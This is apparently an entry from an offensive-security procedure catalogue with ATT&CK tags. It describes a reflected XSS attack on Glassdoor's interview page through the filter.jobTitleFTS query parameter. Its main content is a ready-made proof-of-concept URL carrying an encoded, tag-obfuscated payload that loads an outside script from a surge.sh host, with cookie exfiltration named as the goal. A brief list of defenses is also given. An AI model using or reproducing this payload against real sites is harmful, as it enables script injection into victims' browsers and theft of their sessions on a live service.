---
tags:
  - xss-injection
  - payload-delivery
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:15.813Z'
sub_techniques: []
id: 4bc2c690-5d2e-4d36-9a0f-ca7518998574
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Filter-Parameter

## Summary

This procedure injects a URL-encoded XSS payload into the filter.jobTitleFTS parameter on Glassdoor's interview page, exploiting insufficient sanitization to reflect and execute JavaScript.

## Description

The vulnerability stems from lack of input validation on the filter.jobTitleFTS query parameter, allowing reflected injection. The payload uses tag obfuscation (e.g., <<<a>a> for <script>) and loads an external JS file for execution. This enables arbitrary code in the victim's browser context, such as cookie exfiltration.

## Requirements

1. Prepared URL with countryRedirect=true
2. Knowledge of URL encoding for payloads
3. Browser capable of executing external scripts

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all query parameters before reflection in HTML/JS contexts
- Implement Content Security Policy (CSP) to block external script loads
- Log and alert on suspicious encoded payloads in query strings

## Objectives

1. Deliver the XSS payload via URL parameter
2. Achieve reflection without escaping
3. Set up for JavaScript execution

## Instructions

### Step 1: Construct and Load Payload URL

**Context**: Replace the filter value with the encoded payload and navigate to the full URL.

Use this PoC URL:

```url
https://www.glassdoor.com/Interview/Accenture-Interview-Questions-E4138.htm?filter.jobTitleFTS=%3c%3c%3ca%3ea%3escript%20SrC%3d%22%68%74%74%70s%3a%2f%2f%73%6b%69%6e%6e%79%2d%66%65%61%72%2e%73%75%72%67%65%2e%73%68%2f%70%61%79%6c%6f%61%64%2e%6a%73%22%3e%3c%3c%3ca%3ea%3e%2fscript%3e&countryRedirect=true
```

> View page source to confirm the payload is reflected unescaped. The external script at https://skinny-fear.surge.sh/payload.js will load upon rendering.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-injection]]
- [[payload-delivery]]
